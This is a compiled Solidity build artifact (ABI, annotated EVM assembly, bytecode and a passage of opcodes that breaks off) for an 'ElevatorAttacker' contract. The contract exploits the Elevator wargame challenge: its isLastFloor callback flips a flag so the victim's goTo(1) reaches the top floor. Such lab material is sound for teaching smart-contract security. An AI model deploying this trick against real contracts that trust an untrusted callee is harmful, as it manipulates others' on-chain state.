{
	"contract/security/ElevatorAttacker.sol": {
		"AttackBuilding": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "_victim",
							"type": "address"
						}
					],
					"name": "attack",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "flag",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"name": "isLastFloor",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"stateMutability": "nonpayable",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"contract/security/ElevatorAttacker.sol\":539:888  contract AttackBuilding is Building {... */\n  mstore(0x40, 0x80)\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contract/security/ElevatorAttacker.sol\":539:888  contract AttackBuilding is Building {... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x5f9a4bca\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x890eba68\n      eq\n      tag_4\n      jumpi\n      dup1\n      0xd018db3e\n      eq\n      tag_5\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"contract/security/ElevatorAttacker.sol\":607:720  function isLastFloor(uint) external override returns(bool) {... */\n    tag_3:\n      tag_6\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_7\n      swap2\n      swap1\n      tag_8\n      jump\t// in\n    tag_7:\n      tag_9\n      jump\t// in\n    tag_6:\n      mload(0x40)\n      tag_10\n      swap2\n      swap1\n      tag_11\n      jump\t// in\n    tag_10:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contract/security/ElevatorAttacker.sol\":582:598  bool public flag */\n    tag_4:\n      tag_12\n      tag_13\n      jump\t// in\n    tag_12:\n      mload(0x40)\n      tag_14\n      swap2\n      swap1\n      tag_11\n      jump\t// in\n    tag_14:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contract/security/ElevatorAttacker.sol\":728:885  function attack(address _victim) public {... */\n    tag_5:\n      tag_15\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_16\n      swap2\n      swap1\n      tag_17\n      jump\t// in\n    tag_16:\n      tag_18\n      jump\t// in\n    tag_15:\n      stop\n        /* \"contract/security/ElevatorAttacker.sol\":607:720  function isLastFloor(uint) external override returns(bool) {... */\n    tag_9:\n        /* \"contract/security/ElevatorAttacker.sol\":660:664  bool */\n      0x00\n        /* \"contract/security/ElevatorAttacker.sol\":685:689  flag */\n      dup1\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xff\n      and\n        /* \"contract/security/ElevatorAttacker.sol\":684:689  !flag */\n      iszero\n        /* \"contract/security/ElevatorAttacker.sol\":677:681  flag */\n      0x00\n      dup1\n        /* \"contract/security/ElevatorAttacker.sol\":677:689  flag = !flag */\n      0x0100\n      exp\n      dup2\n      sload\n      dup2\n      0xff\n      mul\n      not\n      and\n      swap1\n      dup4\n      iszero\n      iszero\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"contract/security/ElevatorAttacker.sol\":708:712  flag */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xff\n      and\n        /* \"contract/security/ElevatorAttacker.sol\":707:712  !flag */\n      iszero\n        /* \"contract/security/ElevatorAttacker.sol\":700:712  return !flag */\n      swap1\n      pop\n        /* \"contract/security/ElevatorAttacker.sol\":607:720  function isLastFloor(uint) external override returns(bool) {... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"contract/security/ElevatorAttacker.sol\":582:598  bool public flag */\n    tag_13:\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xff\n      and\n      dup2\n      jump\t// out\n        /* \"contract/security/ElevatorAttacker.sol\":728:885  function attack(address _victim) public {... */\n    tag_18:\n        /* \"contract/security/ElevatorAttacker.sol\":779:799  bytes memory payload */\n      0x00\n        /* \"contract/security/ElevatorAttacker.sol\":843:844  1 */\n      0x01\n        /* \"contract/security/ElevatorAttacker.sol\":802:845  abi.encodeWithSignature(\"goTo(uint256)\", 1) */\n      add(0x24, mload(0x40))\n      tag_21\n      swap2\n      swap1\n      tag_22\n      jump\t// in\n    tag_21:\n      mload(0x40)\n      0x20\n      dup2\n      dup4\n      sub\n      sub\n      dup2\n      mstore\n      swap1\n      0x40\n      mstore\n      and(not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff), 0xed9a713400000000000000000000000000000000000000000000000000000000)\n      0x20\n      dup3\n      add\n      dup1\n      mload\n      0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n      dup4\n      dup2\n      dup4\n      and\n      or\n      dup4\n      mstore\n      pop\n      pop\n      pop\n      pop\n        /* \"contract/security/ElevatorAttacker.sol\":779:845  bytes memory payload = abi.encodeWithSignature(\"goTo(uint256)\", 1) */\n      swap1\n      pop\n        /* \"contract/security/ElevatorAttacker.sol\":856:863  _victim */\n      dup2\n        /* \"contract/security/ElevatorAttacker.sol\":856:868  _victim.call */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contract/security/ElevatorAttacker.sol\":869:876  payload */\n      dup2\n        /* \"contract/security/ElevatorAttacker.sol\":856:877  _victim.call(payload) */\n      mload(0x40)\n      tag_23\n      swap2\n      swap1\n      tag_24\n      jump\t// in\n    tag_23:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup7\n      gas\n      call\n      swap2\n      pop\n      pop\n      returndatasize\n      dup1\n      0x00\n      dup2\n      eq\n      tag_27\n      jumpi\n      mload(0x40)\n      swap2\n      pop\n      and(add(returndatasize, 0x3f), not(0x1f))\n      dup3\n      add\n      0x40\n      mstore\n      returndatasize\n      dup3\n      mstore\n      returndatasize\n      0x00\n      0x20\n      dup5\n      add\n      returndatacopy\n      jump(tag_26)\n    tag_27:\n      0x60\n      swap2\n      pop\n    tag_26:\n      pop\n      pop\n      pop\n        /* \"contract/security/ElevatorAttacker.sol\":768:885  {... */\n      pop\n        /* \"contract/security/ElevatorAttacker.sol\":728:885  function attack(address _victim) public {... */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":88:205   */\n    tag_29:\n        /* \"#utility.yul\":197:198   */\n      0x00\n        /* \"#utility.yul\":194:195   */\n      dup1\n        /* \"#utility.yul\":187:199   */\n      revert\n        /* \"#utility.yul\":334:411   */\n    tag_31:\n        /* \"#utility.yul\":371:378   */\n      0x00\n        /* \"#utility.yul\":400:405   */\n      dup2\n        /* \"#utility.yul\":389:405   */\n      swap1\n      pop\n        /* \"#utility.yul\":334:411   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":417:539   */\n    tag_32:\n        /* \"#utility.yul\":490:514   */\n      tag_55\n        /* \"#utility.yul\":508:513   */\n      dup2\n        /* \"#utility.yul\":490:514   */\n      tag_31\n      jump\t// in\n    tag_55:\n        /* \"#utility.yul\":483:488   */\n      dup2\n        /* \"#utility.yul\":480:515   */\n      eq\n        /* \"#utility.yul\":470:533   */\n      tag_56\n      jumpi\n        /* \"#utility.yul\":529:530   */\n      0x00\n        /* \"#utility.yul\":526:527   */\n      dup1\n        /* \"#utility.yul\":519:531   */\n      revert\n        /* \"#utility.yul\":470:533   */\n    tag_56:\n        /* \"#utility.yul\":417:539   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":545:684   */\n    tag_33:\n        /* \"#utility.yul\":591:596   */\n      0x00\n        /* \"#utility.yul\":629:635   */\n      dup2\n        /* \"#utility.yul\":616:636   */\n      calldataload\n        /* \"#utility.yul\":607:636   */\n      swap1\n      pop\n        /* \"#utility.yul\":645:678   */\n      tag_58\n        /* \"#utility.yul\":672:677   */\n      dup2\n        /* \"#utility.yul\":645:678   */\n      tag_32\n      jump\t// in\n    tag_58:\n        /* \"#utility.yul\":545:684   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":690:1019   */\n    tag_8:\n        /* \"#utility.yul\":749:755   */\n      0x00\n        /* \"#utility.yul\":798:800   */\n      0x20\n        /* \"#utility.yul\":786:795   */\n      dup3\n        /* \"#utility.yul\":777:784   */\n      dup5\n        /* \"#utility.yul\":773:796   */\n      sub\n        /* \"#utility.yul\":769:801   */\n      slt\n        /* \"#utility.yul\":766:885   */\n      iszero\n      tag_60\n      jumpi\n        /* \"#utility.yul\":804:883   */\n      tag_61\n      tag_29\n      jump\t// in\n    tag_61:\n        /* \"#utility.yul\":766:885   */\n    tag_60:\n        /* \"#utility.yul\":924:925   */\n      0x00\n        /* \"#utility.yul\":949:1002   */\n      tag_62\n        /* \"#utility.yul\":994:1001   */\n      dup5\n        /* \"#utility.yul\":985:991   */\n      dup3\n        /* \"#utility.yul\":974:983   */\n      dup6\n        /* \"#utility.yul\":970:992   */\n      add\n        /* \"#utility.yul\":949:1002   */\n      tag_33\n      jump\t// in\n    tag_62:\n        /* \"#utility.yul\":939:1002   */\n      swap2\n      pop\n        /* \"#utility.yul\":895:1012   */\n      pop\n        /* \"#utility.yul\":690:1019   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1025:1115   */\n    tag_34:\n        /* \"#utility.yul\":1059:1066   */\n      0x00\n        /* \"#utility.yul\":1102:1107   */\n      dup2\n        /* \"#utility.yul\":1095:1108   */\n      iszero\n        /* \"#utility.yul\":1088:1109   */\n      iszero\n        /* \"#utility.yul\":1077:1109   */\n      swap1\n      pop\n        /* \"#utility.yul\":1025:1115   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1121:1230   */\n    tag_35:\n        /* \"#utility.yul\":1202:1223   */\n      tag_65\n        /* \"#utility.yul\":1217:1222   */\n      dup2\n        /* \"#utility.yul\":1202:1223   */\n      tag_34\n      jump\t// in\n    tag_65:\n        /* \"#utility.yul\":1197:1200   */\n      dup3\n        /* \"#utility.yul\":1190:1224   */\n      mstore\n        /* \"#utility.yul\":1121:1230   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1236:1446   */\n    tag_11:\n        /* \"#utility.yul\":1323:1327   */\n      0x00\n        /* \"#utility.yul\":1361:1363   */\n      0x20\n        /* \"#utility.yul\":1350:1359   */\n      dup3\n        /* \"#utility.yul\":1346:1364   */\n      add\n        /* \"#utility.yul\":1338:1364   */\n      swap1\n      pop\n        /* \"#utility.yul\":1374:1439   */\n      tag_67\n        /* \"#utility.yul\":1436:1437   */\n      0x00\n        /* \"#utility.yul\":1425:1434   */\n      dup4\n        /* \"#utility.yul\":1421:1438   */\n      add\n        /* \"#utility.yul\":1412:1418   */\n      dup5\n        /* \"#utility.yul\":1374:1439   */\n      tag_35\n      jump\t// in\n    tag_67:\n        /* \"#utility.yul\":1236:1446   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1452:1578   */\n    tag_36:\n        /* \"#utility.yul\":1489:1496   */\n      0x00\n        /* \"#utility.yul\":1529:1571   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":1522:1527   */\n      dup3\n        /* \"#utility.yul\":1518:1572   */\n      and\n        /* \"#utility.yul\":1507:1572   */\n      swap1\n      pop\n        /* \"#utility.yul\":1452:1578   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1584:1680   */\n    tag_37:\n        /* \"#utility.yul\":1621:1628   */\n      0x00\n        /* \"#utility.yul\":1650:1674   */\n      tag_70\n        /* \"#utility.yul\":1668:1673   */\n      dup3\n        /* \"#utility.yul\":1650:1674   */\n      tag_36\n      jump\t// in\n    tag_70:\n        /* \"#utility.yul\":1639:1674   */\n      swap1\n      pop\n        /* \"#utility.yul\":1584:1680   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1686:1808   */\n    tag_38:\n        /* \"#utility.yul\":1759:1783   */\n      tag_72\n        /* \"#utility.yul\":1777:1782   */\n      dup2\n        /* \"#utility.yul\":1759:1783   */\n      tag_37\n      jump\t// in\n    tag_72:\n        /* \"#utility.yul\":1752:1757   */\n      dup2\n        /* \"#utility.yul\":1749:1784   */\n      eq\n        /* \"#utility.yul\":1739:1802   */\n      tag_73\n      jumpi\n        /* \"#utility.yul\":1798:1799   */\n      0x00\n        /* \"#utility.yul\":1795:1796   */\n      dup1\n        /* \"#utility.yul\":1788:1800   */\n      revert\n        /* \"#utility.yul\":1739:1802   */\n    tag_73:\n        /* \"#utility.yul\":1686:1808   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1814:1953   */\n    tag_39:\n        /* \"#utility.yul\":1860:1865   */\n      0x00\n        /* \"#utility.yul\":1898:1904   */\n      dup2\n        /* \"#utility.yul\":1885:1905   */\n      calldataload\n        /* \"#utility.yul\":1876:1905   */\n      swap1\n      pop\n        /* \"#utility.yul\":1914:1947   */\n      tag_75\n        /* \"#utility.yul\":1941:1946   */\n      dup2\n        /* \"#utility.yul\":1914:1947   */\n      tag_38\n      jump\t// in\n    tag_75:\n        /* \"#utility.yul\":1814:1953   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1959:2288   */\n    tag_17:\n        /* \"#utility.yul\":2018:2024   */\n      0x00\n        /* \"#utility.yul\":2067:2069   */\n      0x20\n        /* \"#utility.yul\":2055:2064   */\n      dup3\n        /* \"#utility.yul\":2046:2053   */\n      dup5\n        /* \"#utility.yul\":2042:2065   */\n      sub\n        /* \"#utility.yul\":2038:2070   */\n      slt\n        /* \"#utility.yul\":2035:2154   */\n      iszero\n      tag_77\n      jumpi\n        /* \"#utility.yul\":2073:2152   */\n      tag_78\n      tag_29\n      jump\t// in\n    tag_78:\n        /* \"#utility.yul\":2035:2154   */\n    tag_77:\n        /* \"#utility.yul\":2193:2194   */\n      0x00\n        /* \"#utility.yul\":2218:2271   */\n      tag_79\n        /* \"#utility.yul\":2263:2270   */\n      dup5\n        /* \"#utility.yul\":2254:2260   */\n      dup3\n        /* \"#utility.yul\":2243:2252   */\n      dup6\n        /* \"#utility.yul\":2239:2261   */\n      add\n        /* \"#utility.yul\":2218:2271   */\n      tag_39\n      jump\t// in\n    tag_79:\n        /* \"#utility.yul\":2208:2271   */\n      swap2\n      pop\n        /* \"#utility.yul\":2164:2281   */\n      pop\n        /* \"#utility.yul\":1959:2288   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2294:2379   */\n    tag_40:\n        /* \"#utility.yul\":2339:2346   */\n      0x00\n        /* \"#utility.yul\":2368:2373   */\n      dup2\n        /* \"#utility.yul\":2357:2373   */\n      swap1\n      pop\n        /* \"#utility.yul\":2294:2379   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2385:2471   */\n    tag_41:\n        /* \"#utility.yul\":2420:2427   */\n      0x00\n        /* \"#utility.yul\":2460:2464   */\n      0xff\n        /* \"#utility.yul\":2453:2458   */\n      dup3\n        /* \"#utility.yul\":2449:2465   */\n      and\n        /* \"#utility.yul\":2438:2465   */\n      swap1\n      pop\n        /* \"#utility.yul\":2385:2471   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2477:2537   */\n    tag_42:\n        /* \"#utility.yul\":2505:2508   */\n      0x00\n        /* \"#utility.yul\":2526:2531   */\n      dup2\n        /* \"#utility.yul\":2519:2531   */\n      swap1\n      pop\n        /* \"#utility.yul\":2477:2537   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2543:2697   */\n    tag_43:\n        /* \"#utility.yul\":2599:2608   */\n      0x00\n        /* \"#utility.yul\":2632:2691   */\n      tag_84\n        /* \"#utility.yul\":2648:2690   */\n      tag_85\n        /* \"#utility.yul\":2657:2689   */\n      tag_86\n        /* \"#utility.yul\":2683:2688   */\n      dup5\n        /* \"#utility.yul\":2657:2689   */\n      tag_40\n      jump\t// in\n    tag_86:\n        /* \"#utility.yul\":2648:2690   */\n      tag_42\n      jump\t// in\n    tag_85:\n        /* \"#utility.yul\":2632:2691   */\n      tag_41\n      jump\t// in\n    tag_84:\n        /* \"#utility.yul\":2619:2691   */\n      swap1\n      pop\n        /* \"#utility.yul\":2543:2697   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2703:2846   */\n    tag_44:\n        /* \"#utility.yul\":2796:2839   */\n      tag_88\n        /* \"#utility.yul\":2833:2838   */\n      dup2\n        /* \"#utility.yul\":2796:2839   */\n      tag_43\n      jump\t// in\n    tag_88:\n        /* \"#utility.yul\":2791:2794   */\n      dup3\n        /* \"#utility.yul\":2784:2840   */\n      mstore\n        /* \"#utility.yul\":2703:2846   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2852:3086   */\n    tag_22:\n        /* \"#utility.yul\":2951:2955   */\n      0x00\n        /* \"#utility.yul\":2989:2991   */\n      0x20\n        /* \"#utility.yul\":2978:2987   */\n      dup3\n        /* \"#utility.yul\":2974:2992   */\n      add\n        /* \"#utility.yul\":2966:2992   */\n      swap1\n      pop\n        /* \"#utility.yul\":3002:3079   */\n      tag_90\n        /* \"#utility.yul\":3076:3077   */\n      0x00\n        /* \"#utility.yul\":3065:3074   */\n      dup4\n        /* \"#utility.yul\":3061:3078   */\n      add\n        /* \"#utility.yul\":3052:3058   */\n      dup5\n        /* \"#utility.yul\":3002:3079   */\n      tag_44\n      jump\t// in\n    tag_90:\n        /* \"#utility.yul\":2852:3086   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3092:3190   */\n    tag_45:\n        /* \"#utility.yul\":3143:3149   */\n      0x00\n        /* \"#utility.yul\":3177:3182   */\n      dup2\n        /* \"#utility.yul\":3171:3183   */\n      mload\n        /* \"#utility.yul\":3161:3183   */\n      swap1\n      pop\n        /* \"#utility.yul\":3092:3190   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3196:3343   */\n    tag_46:\n        /* \"#utility.yul\":3297:3308   */\n      0x00\n        /* \"#utility.yul\":3334:3337   */\n      dup2\n        /* \"#utility.yul\":3319:3337   */\n      swap1\n      pop\n        /* \"#utility.yul\":3196:3343   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3349:3656   */\n    tag_47:\n        /* \"#utility.yul\":3417:3418   */\n      0x00\n        /* \"#utility.yul\":3427:3540   */\n    tag_94:\n        /* \"#utility.yul\":3441:3447   */\n      dup4\n        /* \"#utility.yul\":3438:3439   */\n      dup2\n        /* \"#utility.yul\":3435:3448   */\n      lt\n        /* \"#utility.yul\":3427:3540   */\n      iszero\n      tag_96\n      jumpi\n        /* \"#utility.yul\":3526:3527   */\n      dup1\n        /* \"#utility.yul\":3521:3524   */\n      dup3\n        /* \"#utility.yul\":3517:3528   */\n      add\n        /* \"#utility.yul\":3511:3529   */\n      mload\n        /* \"#utility.yul\":3507:3508   */\n      dup2\n        /* \"#utility.yul\":3502:3505   */\n      dup5\n        /* \"#utility.yul\":3498:3509   */\n      add\n        /* \"#utility.yul\":3491:3530   */\n      mstore\n        /* \"#utility.yul\":3463:3465   */\n      0x20\n        /* \"#utility.yul\":3460:3461   */\n      dup2\n        /* \"#utility.yul\":3456:3466   */\n      add\n        /* \"#utility.yul\":3451:3466   */\n      swap1\n      pop\n        /* \"#utility.yul\":3427:3540   */\n      jump(tag_94)\n    tag_96:\n        /* \"#utility.yul\":3558:3564   */\n      dup4\n        /* \"#utility.yul\":3555:3556   */\n      dup2\n        /* \"#utility.yul\":3552:3565   */\n      gt\n        /* \"#utility.yul\":3549:3650   */\n      iszero\n      tag_97\n      jumpi\n        /* \"#utility.yul\":3638:3639   */\n      0x00\n        /* \"#utility.yul\":3629:3635   */\n      dup5\n        /* \"#utility.yul\":3624:3627   */\n      dup5\n        /* \"#utility.yul\":3620:3636   */\n      add\n        /* \"#utility.yul\":3613:3640   */\n      mstore\n        /* \"#utility.yul\":3549:3650   */\n    tag_97:\n        /* \"#utility.yul\":3398:3656   */\n      pop\n        /* \"#utility.yul\":3349:3656   */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3662:4035   */\n    tag_48:\n        /* \"#utility.yul\":3766:3769   */\n      0x00\n        /* \"#utility.yul\":3794:3832   */\n      tag_99\n        /* \"#utility.yul\":3826:3831   */\n      dup3\n        /* \"#utility.yul\":3794:3832   */\n      tag_45\n      jump\t// in\n    tag_99:\n        /* \"#utility.yul\":3848:3936   */\n      tag_100\n        /* \"#utility.yul\":3929:3935   */\n      dup2\n        /* \"#utility.yul\":3924:3927   */\n      dup6\n        /* \"#utility.yul\":3848:3936   */\n      tag_46\n      jump\t// in\n    tag_100:\n        /* \"#utility.yul\":3841:3936   */\n      swap4\n      pop\n        /* \"#utility.yul\":3945:3997   */\n      tag_101\n        /* \"#utility.yul\":3990:3996   */\n      dup2\n        /* \"#utility.yul\":3985:3988   */\n      dup6\n        /* \"#utility.yul\":3978:3982   */\n      0x20\n        /* \"#utility.yul\":3971:3976   */\n      dup7\n        /* \"#utility.yul\":3967:3983   */\n      add\n        /* \"#utility.yul\":3945:3997   */\n      tag_47\n      jump\t// in\n    tag_101:\n        /* \"#utility.yul\":4022:4028   */\n      dup1\n        /* \"#utility.yul\":4017:4020   */\n      dup5\n        /* \"#utility.yul\":4013:4029   */\n      add\n        /* \"#utility.yul\":4006:4029   */\n      swap2\n      pop\n        /* \"#utility.yul\":3770:4035   */\n      pop\n        /* \"#utility.yul\":3662:4035   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4041:4312   */\n    tag_24:\n        /* \"#utility.yul\":4171:4174   */\n      0x00\n        /* \"#utility.yul\":4193:4286   */\n      tag_103\n        /* \"#utility.yul\":4282:4285   */\n      dup3\n        /* \"#utility.yul\":4273:4279   */\n      dup5\n        /* \"#utility.yul\":4193:4286   */\n      tag_48\n      jump\t// in\n    tag_103:\n        /* \"#utility.yul\":4186:4286   */\n      swap2\n      pop\n        /* \"#utility.yul\":4303:4306   */\n      dup2\n        /* \"#utility.yul\":4296:4306   */\n      swap1\n      pop\n        /* \"#utility.yul\":4041:4312   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa26469706673582212206a0db2f790cf17f60cdafa8b5946e61d5340cae167b693b4dba4fce06ece538b64736f6c634300080c0033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561001057600080fd5b5061045f806100206000396000f3fe608060405234801561001057600080fd5b50600436106100415760003560e01c80635f9a4bca14610046578063890eba6814610076578063d018db3e14610094575b600080fd5b610060600480360381019061005b919061023d565b6100b0565b60405161006d9190610285565b60405180910390f35b61007e6100f0565b60405161008b9190610285565b60405180910390f35b6100ae60048036038101906100a991906102fe565b610101565b005b60008060009054906101000a900460ff16156000806101000a81548160ff02191690831515021790555060008054906101000a900460ff16159050919050565b60008054906101000a900460ff1681565b60006001604051602401610115919061037d565b6040516020818303038152906040527fed9a7134000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff838183161783525050505090508173ffffffffffffffffffffffffffffffffffffffff16816040516101b99190610412565b6000604051808303816000865af19150503d80600081146101f6576040519150601f19603f3d011682016040523d82523d6000602084013e6101fb565b606091505b5050505050565b600080fd5b6000819050919050565b61021a81610207565b811461022557600080fd5b50565b60008135905061023781610211565b92915050565b60006020828403121561025357610252610202565b5b600061026184828501610228565b91505092915050565b60008115159050919050565b61027f8161026a565b82525050565b600060208201905061029a6000830184610276565b92915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006102cb826102a0565b9050919050565b6102db816102c0565b81146102e657600080fd5b50565b6000813590506102f8816102d2565b92915050565b60006020828403121561031457610313610202565b5b6000610322848285016102e9565b91505092915050565b6000819050919050565b600060ff82169050919050565b6000819050919050565b600061036761036261035d8461032b565b610342565b610335565b9050919050565b6103778161034c565b82525050565b6000602082019050610392600083018461036e565b92915050565b600081519050919050565b600081905092915050565b60005b838110156103cc5780820151818401526020810190506103b1565b838111156103db576000848401525b50505050565b60006103ec82610398565b6103f681856103a3565b93506104068185602086016103ae565b80840191505092915050565b600061041e82846103e1565b91508190509291505056fea26469706673582212206a0db2f790cf17f60cdafa8b5946e61d5340cae167b693b4dba4fce06ece538b64736f6c634300080c0033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x45F DUP1 PUSH2 0x20 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x41 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x5F9A4BCA EQ PUSH2 0x46 JUMPI DUP1 PUSH4 0x890EBA68 EQ PUSH2 0x76 JUMPI DUP1 PUSH4 0xD018DB3E EQ PUSH2 0x94 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x60 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x5B SWAP2 SWAP1 PUSH2 0x23D JUMP JUMPDEST PUSH2 0xB0 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x6D SWAP2 SWAP1 PUSH2 0x285 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x7E PUSH2 0xF0 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x8B SWAP2 SWAP1 PUSH2 0x285 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0xAE PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0xA9 SWAP2 SWAP1 PUSH2 0x2FE JUMP JUMPDEST PUSH2 0x101 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND ISZERO PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 PUSH1 0x40 MLOAD PUSH1 0x24 ADD PUSH2 0x115 SWAP2 SWAP1 PUSH2 0x37D JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH32 0xED9A713400000000000000000000000000000000000000000000000000000000 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH1 0x20 DUP3 ADD DUP1 MLOAD PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP4 DUP2 DUP4 AND OR DUP4 MSTORE POP POP POP POP SWAP1 POP DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 PUSH1 0x40 MLOAD PUSH2 0x1B9 SWAP2 SWAP1 PUSH2 0x412 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP7 GAS CALL SWAP2 POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x1F6 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x1FB JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 